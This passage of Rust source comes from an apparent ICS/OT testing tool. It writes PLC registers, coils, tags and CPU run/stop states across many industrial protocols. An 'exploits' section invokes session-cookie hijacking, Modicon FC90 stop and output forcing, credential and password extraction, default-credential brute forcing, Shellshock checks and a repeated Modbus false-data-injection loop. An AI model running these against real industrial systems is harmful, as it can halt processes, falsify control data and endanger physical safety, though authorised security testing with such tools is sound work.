                    _ => crate::display::text(&payload),
                };
                println!(
                    "  {} = {}  {}",
                    crate::display::tag_name(name),
                    rendered,
                    crate::display::type_name(&format!("[{kind}]"))
                );
            } else {
                crate::display::print_warn(&format!(
                    "No message received on '{name}' within {timeout}s."
                ));
            }
        }
        Some(Protocol::Modbus) => {
            use casket::core::modbus;
            let mb_port = if port == 0 { 502 } else { port };
            let raw_addr = parse_modbus_addr(name)?;
            let pb = crate::display::spinner_start(&format!("Reading Modbus register {name}â€¦"));
            let result = modbus::read_holding_registers(ip, mb_port, raw_addr, 1);
            pb.finish_and_clear();
            match result {
                Ok(regs) if !regs.is_empty() => {
                    println!(
                        "  {} = {}",
                        crate::display::address(&regs[0].display_addr.to_string()),
                        crate::display::decoded_value(&regs[0].value_str)
                    );
                }
                Ok(_) => crate::display::print_warn("No value returned."),
                Err(e) => crate::display::print_error(&format!("{e}")),
            }
        }
        Some(Protocol::Enip) => {
            bail!("EtherNet/IP tag read requires --protocol rockwell (CIP tag access)");
        }
        Some(p) => bail!("{p:?} does not support 'get tag'"),
        None => bail!("'--protocol <PROTO>' required for 'get tag'"),
    }
    Ok(())
}

// ===================================================================
// Set
// ===================================================================

/// Run a mutating command and remove only the stale value cache that its
/// acknowledgement could have invalidated.  `--no-cache` deliberately leaves
/// the database untouched, including this invalidation step.
fn run_set_and_invalidate_cache(
    ip: &str,
    port: u16,
    timeout: u64,
    protocol: Protocol,
    noun: SetNoun,
    live_type_lookup: bool,
    update_cache: bool,
) -> Result<()> {
    run_set(ip, port, timeout, Some(protocol), noun, live_type_lookup)?;
    if update_cache {
        invalidate_protocol_value_cache(ip, protocol);
    }
    Ok(())
}

#[allow(clippy::too_many_lines)]
fn run_set(
    ip: &str,
    port: u16,
    timeout: u64,
    protocol: Option<Protocol>,
    noun: SetNoun,
    live_type_lookup: bool,
) -> Result<()> {
    match noun {
        SetNoun::State { state } => set_state(ip, port, timeout, &state, protocol),
        SetNoun::Tag {
            assignment,
            r#type,
            retain,
        } => set_tag(
            ip,
            port,
            timeout,
            &assignment,
            &r#type,
            retain,
            protocol,
            live_type_lookup,
        ),
        SetNoun::EwonRegister {
            address,
            value,
            r#type,
            unit_id,
        } => set_ewon_register(ip, port, address, &value, r#type, unit_id),
        SetNoun::EwonCoil {
            address,
            state,
            unit_id,
        } => set_ewon_coil(ip, port, address, &state, unit_id),
        SetNoun::Register { address, value } => {
            use casket::vendors::schneider::modbus;
            crate::display::print_info(&format!("Writing register {address} = {value} on {ip}â€¦"));
            modbus::write_single_register(ip, port, address, value)?;
            crate::display::print_success("Register written.");
            Ok(())
        }
        SetNoun::Registers { start, values } => {
            use casket::vendors::schneider::modbus;
            let parsed: Vec<u16> = values
                .split(',')
                .filter_map(|s| s.trim().parse::<u16>().ok())
                .collect();
            if parsed.is_empty() {
                bail!("No valid register values in '{values}' â€” expected comma-separated decimals, e.g. 100,200,300");
            }
            let count = modbus::write_multiple_registers(ip, port, start, &parsed)?;
            crate::display::print_success(&format!("{count} register(s) written."));
            Ok(())
        }
        SetNoun::Coil { address, state } => {
            use casket::vendors::schneider::modbus;
            let on = if state.eq_ignore_ascii_case("on") {
                true
            } else if state.eq_ignore_ascii_case("off") {
                false
            } else {
                anyhow::bail!("Unknown coil state '{state}': use 'on' or 'off'");
            };
            crate::display::print_info(&format!(
                "Writing coil {address} = {} on {ip}â€¦",
                if on { "ON" } else { "OFF" }
            ));
            modbus::write_single_coil(ip, port, address, on)?;
            crate::display::print_success("Coil written.");
            Ok(())
        }
        SetNoun::Output { bits, password } => {
            use casket::vendors::siemens::s7comm;
            let s7_port = if port == 0 { 102 } else { port };
            crate::display::print_info(&format!("Writing outputs to {ip}â€¦"));
            if s7comm::set_outputs(ip, &bits, s7_port, timeout, password.as_deref()) {
                crate::display::print_success("Outputs written.");
                Ok(())
            } else {
                bail!("Siemens output write was not acknowledged")
            }
        }
        SetNoun::Merkers {
            bits_offset,
            password,
        } => {
            use casket::vendors::siemens::s7comm;
            let s7_port = if port == 0 { 102 } else { port };
            let parts: Vec<&str> = bits_offset.splitn(2, ',').collect();
            let bits = parts[0];
            let offset: u32 = parts.get(1).and_then(|s| s.parse().ok()).unwrap_or(0);
            crate::display::print_info(&format!("Writing merkers to {ip} (offset {offset})â€¦"));
            if s7comm::set_merkers(ip, bits, offset, s7_port, timeout, password.as_deref()) {
                crate::display::print_success("Merkers written.");
                Ok(())
            } else {
                bail!("Siemens merker write was not acknowledged")
            }
        }
        SetNoun::Dm { start, values } => {
            use casket::vendors::omron::fins;
            let fins_port = if port == 0 { 9600 } else { port };
            let parsed: Vec<u16> = values
                .split(',')
                .filter_map(|s| s.trim().parse::<u16>().ok())
                .collect();
            if parsed.is_empty() {
                bail!("No valid DM word values in '{values}' â€” expected comma-separated decimals, e.g. 100,200,300");
            }
            fins::write_dm_words(ip, fins_port, 0, start, &parsed)?;
            crate::display::print_success(&format!(
                "{} DM word(s) written at DM{start}.",
                parsed.len()
            ));
            Ok(())
        }
        SetNoun::Db {
            db,
            offset,
            data,
            password,
        } => {
            use casket::vendors::siemens::s7comm;
            let s7_port = if port == 0 { 102 } else { port };
            let bytes = parse_hex(&data);
            if bytes.is_empty() {
                bail!("Invalid hex data '{data}' â€” expected even-length hex string, e.g. deadbeef");
            }
            crate::display::print_info(&format!(
                "Writing {} byte(s) to DB{db}:{offset} on {ip}â€¦",
                bytes.len()
            ));
            match s7comm::write_data_block(
                ip,
                db,
                offset,
                &bytes,
                s7_port,
                timeout,
                password.as_deref(),
            ) {
                Ok(true) => {
                    crate::display::print_success("DB write acknowledged.");
                    Ok(())
                }
                Ok(false) => bail!("Siemens DB write was not acknowledged"),
                Err(e) => Err(e),
            }
        }
        SetNoun::D { start, values } => {
            use casket::vendors::mitsubishi::slmp;
            let slmp_port = if port == 0 { 5007 } else { port };
            let parsed: Vec<u16> = values
                .split(',')
                .filter_map(|s| s.trim().parse::<u16>().ok())
                .collect();
            if parsed.is_empty() {
                bail!("No valid D register values in '{values}' â€” expected comma-separated decimals, e.g. 100,200");
            }
            slmp::write_word_devices(ip, slmp_port, "D", start, &parsed)?;
            crate::display::print_success(&format!(
                "{} D register(s) written at D{start}.",
                parsed.len()
            ));
            Ok(())
        }
        SetNoun::M { start, bits } => {
            use casket::vendors::mitsubishi::slmp;
            let slmp_port = if port == 0 { 5007 } else { port };
            let parsed: Vec<bool> = bits
                .trim()
                .chars()
                .filter_map(|c| match c {
                    '0' => Some(false),
                    '1' => Some(true),
                    _ => None,
                })
                .collect();
            if parsed.is_empty() {
                bail!("No valid bit values in '{bits}' (use 0/1 characters)");
            }
            slmp::write_bit_devices(ip, slmp_port, "M", start, &parsed)?;
            crate::display::print_success(&format!(
                "{} M bit(s) written at M{start}.",
                parsed.len()
            ));
            Ok(())
        }
        SetNoun::Oid {
            oid,
            value,
            community,
            r#type,
            confirm,
        } => {
            use casket::vendors::snmp::client;
            if !confirm {
                bail!("Add --confirm to confirm you intend to write to {ip}");
            }
            let snmp_port = if port == 0 { 161 } else { port };
            let snmp_val = match r#type.as_str() {
                "int" => client::SnmpValue::Integer(value.parse::<i64>()?),
                _ => client::SnmpValue::OctetString(value.into_bytes()),
            };
            let result = client::set(ip, snmp_port, &community, &oid, &snmp_val)?;
            println!("  {oid} â†’ {}", result.display());
            crate::display::print_success("SET accepted.");
            Ok(())
        }
        SetNoun::Sc { ioa, state } => {
            use casket::vendors::iec104::client;
            let iec_port = if port == 0 { 2404 } else { port };
            let on = if state.eq_ignore_ascii_case("on") {
                true
            } else if state.eq_ignore_ascii_case("off") {
                false
            } else {
                anyhow::bail!("Unknown single-command state '{state}': use 'on' or 'off'");
            };
            let mut sess = client::connect(ip, iec_port)?;
            if !client::single_command(&mut sess, ioa, on)? {
                bail!("IEC 104 single command received a negative confirmation")
            }
            crate::display::print_success(&format!(
                "IOA {ioa}: Single Command {} confirmed.",
                if on { "ON" } else { "OFF" }
            ));
            Ok(())
        }
        SetNoun::Dc { ioa, state } => {
            use casket::vendors::iec104::client;
            if !matches!(state, 1..=3) {
                bail!("Invalid double-command state {state}: use 1 (off), 2 (on), or 3 (indeterminate)");
            }
            let iec_port = if port == 0 { 2404 } else { port };
            let state_name = match state {
                1 => "OFF",
                2 => "ON",
                _ => "INDETERMINATE",
            };
            crate::display::print_info(&format!(
                "IEC 104 Double Command IOA {ioa} â†’ {state_name} on {ip}â€¦"
            ));
            let mut sess = client::connect(ip, iec_port)?;
            if !client::double_command(&mut sess, ioa, state)? {
                bail!("IEC 104 double command received a negative confirmation")
            }
            crate::display::print_success("Double Command confirmed.");
            Ok(())
        }
    }
}

#[allow(clippy::too_many_lines)]
fn set_state(
    ip: &str,
    port: u16,
    timeout: u64,
    state: &str,
    proto: Option<Protocol>,
) -> Result<()> {
    match proto {
        Some(Protocol::Siemens) => {
            use casket::vendors::siemens::s7comm;
            let s7_port = if port == 0 { 102 } else { port };
            if state.eq_ignore_ascii_case("flip") {
                if !s7comm::change_cpu_state(ip, s7_port, timeout, None) {
                    bail!("Siemens CPU state change was not acknowledged")
                }
                let new = s7comm::get_cpu_state(ip, s7_port, timeout, None);
                crate::display::print_success(&format!("New state: {new}"));
            } else {
                let cur = s7comm::get_cpu_state(ip, s7_port, timeout, None);
                let want_run = state.eq_ignore_ascii_case("run");
                let want_stop = state.eq_ignore_ascii_case("stop");
                if want_run && cur.eq_ignore_ascii_case("running") {
                    crate::display::print_info("Already running.");
                } else if want_stop && cur.eq_ignore_ascii_case("stopped") {
                    crate::display::print_info("Already stopped.");
                } else if want_run || want_stop {
                    crate::display::print_info(&format!("Current: {cur}"));
                    if !s7comm::change_cpu_state(ip, s7_port, timeout, None) {
                        bail!("Siemens CPU state change was not acknowledged")
                    }
                    let new = s7comm::get_cpu_state(ip, s7_port, timeout, None);
                    crate::display::print_success(&format!("New state: {new}"));
                } else {
                    bail!("Unknown state '{state}': use run, stop, or flip.")
                }
            }
        }
        Some(Protocol::Omron) => {
            use casket::vendors::omron::fins;
            let fins_port = if port == 0 { 9600 } else { port };
            let mode = if state.eq_ignore_ascii_case("run") {
                fins::CpuMode::Run
            } else if state.eq_ignore_ascii_case("stop") {
                fins::CpuMode::Stop
            } else {
                bail!("Unknown state '{state}': use 'run' or 'stop'.")
            };
            if !fins::set_cpu_state(ip, fins_port, 0, mode)? {
                bail!("FINS CPU mode change was rejected")
            }
            crate::display::print_success(&format!("CPU set to {state}."));
        }
        Some(Protocol::Beckhoff) => {
            use casket::vendors::beckhoff::{ads, scan};
            let local_netid = ads::build_local_netid(&local_ip_for(ip));
            let devs = scan::discover_ip_with_port(ip, timeout, true, port)?;
            let Some(dev) = devs.into_iter().next() else {
                bail!("No Beckhoff device found.")
            };
            scan::set_twincat_state(&dev, &local_netid, state, port)?;
            crate::display::print_success("State command sent.");
        }
        Some(Protocol::Mitsubishi) => {
            use casket::core::network::NetworkInterface;
            use casket::vendors::mitsubishi::control;
            let iface = NetworkInterface {
                name: "auto".into(),
                ip: local_ip_for(ip),
                netmask: "255.255.255.0".into(),
            };
            if !control::set_state_ip(&iface, ip, &state.to_lowercase())? {
                bail!("Mitsubishi state command was not confirmed")
            }
            crate::display::print_success("Command sent.");
        }
        Some(Protocol::Phoenix) => {
            use casket::vendors::phoenix::control;
            let pb = crate::display::spinner_start(&format!("Sending {state} to {ip}â€¦"));
            let action = if state.eq_ignore_ascii_case("stop") {
                "stop"
            } else {
                "start"
            };
            let start_type = match state.to_lowercase().as_str() {
                "warm" => "warm",
                "hot" => "hot",
                _ => "cold",
            };
            let result = control::control_ilc150(ip, port, action, start_type)?;
            pb.finish_and_clear();
            crate::display::print_success(&format!("State: {result}"));
        }
        Some(p) => bail!("{p:?} does not support 'set state'"),
        None => bail!("'--protocol <PROTO>' required for 'set state'"),
    }
    Ok(())
}

#[allow(clippy::too_many_arguments, clippy::too_many_lines)]
fn set_tag(
    ip: &str,
    port: u16,
    timeout: u64,
    assignment: &str,
    type_hint: &str,
    retain: bool,
    proto: Option<Protocol>,
    live_type_lookup: bool,
) -> Result<()> {
    let Some((name, hex_val)) = assignment.split_once('=') else {
        bail!(
            "Tag assignment must be NAME=VALUE, e.g. PUMP_RUN=true or FLOW_RATE=12.5"
        );
    };
    if retain && proto != Some(Protocol::Mqtt) {
        bail!("--retain is supported only for MQTT publishes");
    }
    match proto {
        Some(Protocol::Rockwell) => {
            use casket::vendors::rockwell::driver;
            let enip_port = if port == 0 { 44818 } else { port };
            let type_code = resolve_rockwell_write_type(
                ip,
                enip_port,
                name,
                type_hint,
                hex_val,
                live_type_lookup,
            )?;
            if !driver::is_writable_type(type_code) {
                bail!(
                    "{name} has cached type {} and is not an atomic writable tag",
                    driver::type_name(type_code)
                );
            }
            // Prefer protocol-correct typed encoding.  Raw even-length hex is
            // retained as a compatibility fallback for unmodelled atomic data.
            let value_bytes = driver::encode_value_for_type(type_code, hex_val)
                .or_else(|typed_error| {
                    let raw = parse_hex(hex_val);
                    if raw.is_empty() {
                        Err(typed_error)
                    } else {
                        Ok(raw)
                    }
                })
                .with_context(|| format!(
                    "encode Rockwell {name} as {}; use values such as true, 123, or 12.5 (raw hex remains supported)",
                    driver::type_name(type_code)
                ))?;
            driver::write_tag(ip, enip_port, name, type_code, &value_bytes)?;
            crate::display::print_success(&format!("{name}: written"));
        }
        Some(Protocol::Beckhoff) => {
            use casket::vendors::beckhoff::{ads, scan};
            let local_netid = ads::build_local_netid(&local_ip_for(ip));
            let value_bytes = parse_hex(hex_val);
            if value_bytes.is_empty() {
                bail!("Invalid hex value '{hex_val}'");
            }
            let pb = crate::display::spinner_start(&format!("Discovering {ip}â€¦"));
            let devs = scan::discover_ip_with_port(ip, timeout, true, port)?;
            pb.finish_and_clear();
            let Some(dev) = devs.into_iter().next() else {
                bail!("No Beckhoff device found.")
            };
            if !scan::write_symbol_value(&dev, &local_netid, name, value_bytes, port)? {
                bail!("ADS write returned an error code")
            }
            crate::display::print_success(&format!("Symbol '{name}' written."));
        }
        Some(Protocol::Phoenix) => {
            use casket::vendors::phoenix::webvisit;
            if !webvisit::write_tag_value(ip, port, name, hex_val)? {
                bail!("Phoenix WebVisit write was not accepted")
            }
            crate::display::print_success(&format!("Wrote {name} = {hex_val}"));
        }
        Some(Protocol::Mqtt) => {
            use casket::vendors::mqtt::{client, session::{ConnectOptions, MqttSession}};
            use std::time::{Duration, Instant};

            let mqtt_port = if port == 0 { client::MQTT_PORT } else { port };
            let opts = ConnectOptions {
                host: ip.to_string(),
                port: mqtt_port,
                client_id: "scadaver-pub".to_string(),
                ..Default::default()
            };
            let payload = mqtt_payload(hex_val, type_hint)?;
            crate::display::print_info(&format!(
                "Publishing {} byte(s) to '{name}' on {ip}:{mqtt_port}{}â€¦",
                payload.len(),
                if retain { " as retained state" } else { "" }
            ));
            let mut sess = MqttSession::connect(&opts)?;
            sess.flush_subacks();
            sess.subscribe(name, 0)?;
            let subscribed = matches!(
                sess.poll_suback(Duration::from_secs(2)),
                Some(code) if code < 0x80
            );
            // A retained value from an earlier run may arrive immediately after
            // SUBSCRIBE. It must not be mistaken for confirmation of this publish.
            sess.drain_messages();
            sess.publish(name, &payload, 0, retain)?;

            if subscribed {
                let deadline = Instant::now() + Duration::from_secs(timeout.min(5));
                let mut echoed = false;
                while Instant::now() < deadline {
                    if sess
                        .drain_messages()
                        .iter()
                        .any(|message| message.topic == name && message.payload == payload)
                    {
                        echoed = true;
                        break;
                    }
                    std::thread::sleep(Duration::from_millis(25));
                }
                if echoed {
                    crate::display::print_success(&format!(
                        "Published {} byte(s) to '{name}'; broker delivery echo confirmed.",
                        payload.len()
                    ));
                } else {
                    crate::display::print_success(&format!(
                        "Published {} byte(s) to '{name}'.",
                        payload.len()
                    ));
                    crate::display::print_warn(
                        "No broker echo observed. MQTT QoS 0 has no publish acknowledgement; use --retain and a live read when a durable value is intended."
                    );
                }
            } else {
                crate::display::print_success(&format!(
                    "Published {} byte(s) to '{name}'.",
                    payload.len()
                ));
                crate::display::print_warn(
                    "Subscription confirmation was unavailable, so this publish could not be read back on the same session."
                );
            }
        }
        Some(Protocol::Iec104) => set_tag_iec104(ip, port, name, hex_val)?,
        Some(Protocol::Siemens) => set_tag_siemens(ip, port, timeout, name, hex_val)?,
        Some(Protocol::Ewon) => bail!(
            "eWON published variables use 'set ewon-register <address> <value>' or 'set ewon-coil <address> <on|off>' over Modbus TCP"
        ),
        Some(p) => bail!("{p:?} does not support 'set tag'"),
        None => bail!("'--protocol <PROTO>' required for 'set tag'"),
    }
    Ok(())
}

fn set_tag_iec104(ip: &str, port: u16, name: &str, hex_val: &str) -> Result<()> {
    use casket::vendors::iec104::client as iec;
    let ioa: u32 = name
        .parse()
        .map_err(|_| anyhow::anyhow!("IOA must be a number, e.g. 10001"))?;
    let on = matches!(hex_val, "1" | "on" | "true");
    let mut sess = iec::connect(ip, port)?;
    if !iec::single_command(&mut sess, ioa, on)? {
        bail!("IEC 104 command received a negative confirmation")
    }
    crate::display::print_success(&format!(
        "IOA {ioa} set to {}.",
        if on { "ON" } else { "OFF" }
    ));
    Ok(())
}

fn set_tag_siemens(ip: &str, port: u16, timeout: u64, name: &str, hex_val: &str) -> Result<()> {
    use casket::vendors::siemens::s7comm;
    if let Some(rest) = name.strip_prefix("DB") {
        let (db_str, off_str) = rest
            .split_once('.')
            .ok_or_else(|| anyhow::anyhow!("DB address format: DB<num>.<offset>  e.g. DB10.0"))?;
        let db_num: u16 = db_str
            .parse()
            .map_err(|_| anyhow::anyhow!("DB number must be u16"))?;
        let offset: u16 = off_str
            .parse()
            .map_err(|_| anyhow::anyhow!("DB offset must be u16"))?;
        let data = parse_hex(hex_val);
        if data.is_empty() && !hex_val.is_empty() {
            bail!("value must be hex bytes, e.g. DEADBEEF");
        }
        match s7comm::write_data_block(ip, db_num, offset, &data, port, timeout, None) {
            Ok(true) => crate::display::print_success("DB write acknowledged."),
            Ok(false) => bail!("Siemens DB write was not acknowledged"),
            Err(e) => return Err(e),
        }
    } else if let Some(rest) = name.strip_prefix('Q') {
        let (byte_str, bit_str) = rest
            .split_once('.')
            .ok_or_else(|| anyhow::anyhow!("Q address format: Q<byte>.<bit>  e.g. Q0.1"))?;
        let byte_idx: u8 = byte_str.parse()?;
        let bit_idx: u8 = bit_str.parse()?;
        let on = matches!(hex_val, "1" | "on" | "true");
        s7comm::write_output_bit(ip, byte_idx, bit_idx, on, port, timeout, None)?;
        crate::display::print_success(&format!(
            "Q{byte_idx}.{bit_idx} â†’ {}.",
            if on { "1" } else { "0" }
        ));
    } else if let Some(rest) = name.strip_prefix('M') {
        let (byte_str, bit_str) = rest
            .split_once('.')
            .ok_or_else(|| anyhow::anyhow!("M address format: M<byte>.<bit>  e.g. M1.3"))?;
        let byte_idx: u8 = byte_str.parse()?;
        let bit_idx: u8 = bit_str.parse()?;
        let on = matches!(hex_val, "1" | "on" | "true");
        s7comm::write_merker_bit(ip, byte_idx, bit_idx, on, port, timeout, None)?;
        crate::display::print_success(&format!(
            "M{byte_idx}.{bit_idx} â†’ {}.",
            if on { "1" } else { "0" }
        ));
    } else {
        bail!("Siemens address must be DB<num>.<offset>, Q<byte>.<bit>, or M<byte>.<bit>");
    }
    Ok(())
}

// ===================================================================
// Run (exploits)
// ===================================================================

#[allow(clippy::too_many_lines)]
fn run_run(ip: &str, port: u16, timeout: u64, cmd: RunCmd) -> Result<()> {
    match cmd {
        RunCmd::Reboot => {
            use casket::vendors::beckhoff::webcontrol;
            crate::display::print_info(&format!("Sending reboot to {ip}â€¦"));
            match webcontrol::reboot(ip, port) {
                Ok(true) => crate::display::print_success("Reboot command sent."),
                Ok(false) => crate::display::print_warn("Reboot sent (no confirmation)."),
                Err(e) => crate::display::print_error(&format!("{e}")),
            }
        }
        RunCmd::AddUser { credentials } => {
            use casket::vendors::beckhoff::webcontrol;
            let (username, password) = credentials
                .split_once(':')
                .unwrap_or((&credentials, "Sc4d4v3r!"));
            crate::display::print_info(&format!("Adding user '{username}' to {ip}â€¦"));
            match webcontrol::add_user(ip, port, username, password) {
                Ok(true) => crate::display::print_success("User creation command sent."),
                Ok(false) => crate::display::print_warn("Command sent (no confirmation)."),
                Err(e) => crate::display::print_error(&format!("{e}")),
            }
        }
        RunCmd::WriteSymbol { input } => {
            use casket::vendors::beckhoff::{ads, scan};
            let local_netid = ads::build_local_netid(&local_ip_for(ip));
            let Some((sym_name, hex_val)) = input.split_once('=') else {
                bail!("Symbol assignment must be NAME=HEXBYTES, e.g. MAIN.valve=01");
            };
            let value_bytes = parse_hex(hex_val);
            if value_bytes.is_empty() {
                bail!("Invalid hex value (format: SymbolName=hexbytes)");
            }
            let pb = crate::display::spinner_start(&format!("Discovering {ip}â€¦"));
            let devs = scan::discover_ip_with_port(ip, timeout, true, port).unwrap_or_default();
            pb.finish_and_clear();
            let Some(dev) = devs.into_iter().next() else {
                bail!("No Beckhoff device responded.");
            };
            match scan::write_symbol_value(&dev, &local_netid, sym_name, value_bytes, port) {
                Ok(true) => {
                    crate::display::print_success(&format!("Symbol '{sym_name}' written."));
                }
                Ok(false) => crate::display::print_warn("Write sent: ADS error code returned."),
                Err(e) => crate::display::print_error(&format!("{e}")),
            }
        }
        RunCmd::FlashLed => {
            use casket::vendors::schneider::flash_led;
            crate::display::print_info(&format!("Sending Flash LED to {ip}â€¦"));
            match flash_led::flash_led_ip(ip) {
                Ok(()) => crate::display::print_success("Flash LED command sent."),
                Err(e) => crate::display::print_error(&format!("{e}")),
            }
        }
        RunCmd::SessionStop | RunCmd::SessionRun => {
            use casket::vendors::schneider::session_hijack;
            let action = if matches!(cmd, RunCmd::SessionStop) {
                "stop"
            } else {
                "run"
            };
            let pb = crate::display::spinner_start(&format!("Fetching session from {ip}â€¦"));
            let session = session_hijack::get_session_cookie(ip, port);
            pb.finish_and_clear();
            let Some(session) = session else {
                bail!("Failed to get session cookie.");
            };
            crate::display::print_success(&format!(
                "Cookie: {} (booted {} times)",
                session.cookie_value, session.power_on_count
            ));
            let ok = session_hijack::control_plc(
                ip,
                port,
                &session.cookie_value,
                "Administrator",
                action,
            );
            if ok {
                crate::display::print_success(&format!("PLC {action} command sent."));
            } else {
                crate::display::print_error(&format!("Failed to {action} PLC."));
            }
        }
        RunCmd::Fc90Stop { model } => {
            use casket::vendors::schneider::modicon_fc90;
            crate::display::print_info(&format!("FC90 STOP ({model}) to {ip}â€¦"));
            let result = if model.eq_ignore_ascii_case("tm221") {
                modicon_fc90::stop_tm221(ip, port)
            } else {
                modicon_fc90::stop_plc(ip, port)
            };
            match result {
                Ok(true) => crate::display::print_success("PLC stopped."),
                Ok(false) => crate::display::print_warn("Command sent: no confirmation."),
                Err(e) => crate::display::print_error(&format!("{e}")),
            }
        }
        RunCmd::Fc90Start { model } => {
            use casket::vendors::schneider::modicon_fc90;
            crate::display::print_info(&format!("FC90 START ({model}) to {ip}â€¦"));
            let result = if model.eq_ignore_ascii_case("tm221") {
                modicon_fc90::start_tm221(ip, port)
            } else {
                modicon_fc90::start_plc(ip, port)
            };
            match result {
                Ok(true) => crate::display::print_success("PLC started."),
                Ok(false) => crate::display::print_warn("Command sent: no confirmation."),
                Err(e) => crate::display::print_error(&format!("{e}")),
            }
        }
        RunCmd::Fc90Force { output, state } => {
            use casket::vendors::schneider::modicon_fc90::{self, ForceState};
            let output_byte = u8::from_str_radix(output.trim().trim_start_matches("0x"), 16)
                .map_err(|_| {
                    anyhow::anyhow!(
                        "Invalid --output value '{}': expected a hex byte, e.g. 0x11 or 1a",
                        output.trim()
                    )
                })?;
            let force_state = match state.to_lowercase().as_str() {
                "off" => ForceState::Off,
                "unforce" => ForceState::Unforce,
                _ => ForceState::On,
            };
            crate::display::print_info(&format!(
                "FC90 Force output 0x{output_byte:02x} to {state} on {ip}â€¦"
            ));
            match modicon_fc90::force_output_bit(ip, port, output_byte, force_state) {
                Ok(true) => crate::display::print_success("Force command sent."),
                Ok(false) => crate::display::print_warn("Command sent: no confirmation."),
                Err(e) => crate::display::print_error(&format!("{e}")),
            }
        }
        RunCmd::Passwords => {
            use casket::vendors::phoenix::webvisit;
            let pb = crate::display::spinner_start(&format!("Retrieving passwords from {ip}â€¦"));
            let result = webvisit::retrieve_passwords(ip, port);
            pb.finish_and_clear();
            match result {
                Ok(entries) if entries.is_empty() => {
                    crate::display::print_warn("No passwords retrieved.");
                }
                Ok(entries) => {
                    for e in &entries {
                        if let Some(p) = &e.password {
                            println!("  User Level {}: {p}", e.user_level);
                        } else if let Some(h) = &e.hash {
                            println!("  User Level {} [sha256]: {h}", e.user_level);
                        }
                    }
                    crate::display::print_success(&format!(
                        "{} password entry/entries found.",
                        entries.len()
                    ));
                }
                Err(e) => crate::display::print_error(&format!("{e}")),
            }
        }
        RunCmd::EwonCreds { max_users } => {
            use casket::vendors::ewon::exploit;
            crate::display::print_info(&format!("Extracting credentials from {ip}â€¦"));
            let users = exploit::exploit(ip, port, "adm", max_users);
            if users.is_empty() {
                crate::display::print_warn("No credentials extracted.");
            } else {
                crate::display::print_success(&format!("Extracted {} credential(s).", users.len()));
            }
        }
        RunCmd::Portscan { ports } => {
            use casket::core::portscan::scan_ot_ports;
            use colored::Colorize;
            let extra: Vec<u16> = ports
                .as_deref()
                .unwrap_or("")
                .split(',')
                .filter_map(|s| s.trim().parse::<u16>().ok())
                .collect();
            crate::display::print_info(&format!("Scanning OT ports on {ip}â€¦"));
            let results = scan_ot_ports(ip, timeout, &extra);
            println!("\n  {:<6} {:<16} Banner", "Port", "Service");
            println!("  {}", "â”€".repeat(60));
            for r in &results {
                if r.open {
                    let banner = r.banner.as_deref().unwrap_or("");
                    println!(
                        "  {:<6} {:<16} {}",
                        r.port.to_string().green(),
                        r.service.green(),
                        banner
                    );
                }
            }
            let open = results.iter().filter(|r| r.open).count();
            println!();
            if open == 0 {
                crate::display::print_warn("No open ports found.");
            } else {
                crate::display::print_success(&format!("{open} open port(s) found."));
            }
        }
        RunCmd::Shellshock { http_port } => {
            use casket::core::shellshock::test_shellshock;
            use colored::Colorize;
            crate::display::print_info(&format!(
                "Testing Shellshock (CVE-2014-6271) on {ip}:{http_port}â€¦"
            ));
            let results = test_shellshock(ip, http_port, timeout);
            println!("\n  {:<36} {:<12} Evidence", "Path", "Status");
            println!("  {}", "â”€".repeat(72));
            let mut any_vuln = false;
            for r in &results {
                let status = if r.vulnerable {
                    any_vuln = true;
                    "VULNERABLE".red().bold()
                } else {
                    "safe".dimmed()
                };
                println!("  {:<36} {:<12} {}", r.path, status, r.evidence);
            }
            println!();
            if any_vuln {
                crate::display::print_warn("Target may be vulnerable to Shellshock.");
            } else {
                crate::display::print_success("No Shellshock vulnerability detected.");
            }
        }
        RunCmd::DefaultCreds {
            path,
            http_port,
            wordlist,
        } => {
            use casket::core::httpcreds::test_http_basic;
            let mut extra_creds: Vec<(String, String)> = Vec::new();
            // creds.toml HTTP pairs
            let creds_cfg = crate::creds::load();
            for entry in creds_cfg.http.credentials {
                extra_creds.push((entry[0].clone(), entry[1].clone()));
            }
            // --wordlist file pairs (appended after creds.toml so file overrides are first)
            if let Some(ref wl_path) = wordlist {
                match crate::creds::load_wordlist(wl_path) {
                    Ok(pairs) => {
                        let mut combined = pairs;
                        combined.extend(extra_creds);
                        extra_creds = combined;
                    }
                    Err(e) => crate::display::print_warn(&format!("[!] Wordlist: {e}")),
                }
            }
            crate::display::print_info(&format!(
                "Testing HTTP credentials on {ip}:{http_port}{path} \
                 ({} extra + built-in defaults)â€¦",
                extra_creds.len()
            ));
            match test_http_basic(ip, http_port, &path, timeout, &extra_creds) {
                Some(r) => {
                    crate::display::print_success(&format!(
                        "Valid credentials: {}:{} (HTTP {})",
                        r.username, r.password, r.status
                    ));
                }
                None => crate::display::print_warn("No default credentials accepted."),
            }
        }
        RunCmd::Fdi {
            address,
            value,
            target,
            interval,
            count,
        } => {
            use casket::core::modbus_fdi::{fdi_loop, FdiTarget};
            let fdi_target = match target.to_lowercase().as_str() {
                "coil" => FdiTarget::Coil,
                _ => FdiTarget::Register,
            };
            let desc = match fdi_target {
                FdiTarget::Coil => format!(
                    "Coil[{address}] = {}",
                    if value != 0 { "ON" } else { "OFF" }
                ),
                FdiTarget::Register => format!("HR[{address}] = {value}"),
            };
            crate::display::print_info(&format!(
                "FDI: injecting {desc} on {ip} every {interval}s{}â€¦",
                if count > 0 {
                    format!(" ({count} writes)")
                } else {
                    " (Ctrl-C to stop)".into()
                }
            ));
            if let Err(e) = fdi_loop(ip, port, address, value, fdi_target, interval, count) {
                crate::display::print_error(&format!("{e}"));
            }
        }
        // ModbusServer is handled before run_run() in the Verb::Run dispatch.
        RunCmd::ModbusServer { .. } => unreachable!(),
        RunCmd::Pcap {
            file,
            iface,
            output,
            count,
        } => {
            use casket::core::capture;
            match file {
                Some(path) => {
                    let obs = capture::ingest_file(&path)?;
                    capture::print_table(&obs);
                }
                None => {
                    #[cfg(feature = "capture")]
                    {
                        capture::live_capture(iface.as_deref(), output.as_deref(), count)?;
                    }
                    #[cfg(not(feature = "capture"))]
                    {
                        let _ = (iface, output, count);
                        anyhow::bail!(
                            "Live capture requires Npcap and the 'capture' feature.\n\
                             Rebuild with: cargo build --features capture\n\
                             Npcap download: https://npcap.com/"
                        );
                    }
                }
            }
        }
    }
    Ok(())
}

// ===================================================================
// DB
// ===================================================================

fn run_db(cmd: DbCmd) -> Result<()> {
    use crate::db::Database;
    let db = Database::open(&Database::default_path())?;
    match cmd {
        DbCmd::Add { ip, vendor } => {
            let vendor = vendor.as_deref().unwrap_or("unknown");
            let id = db.upsert_device(
                &ip,
                vendor,
                &serde_json::Value::Object(serde_json::Map::default()),
            )?;
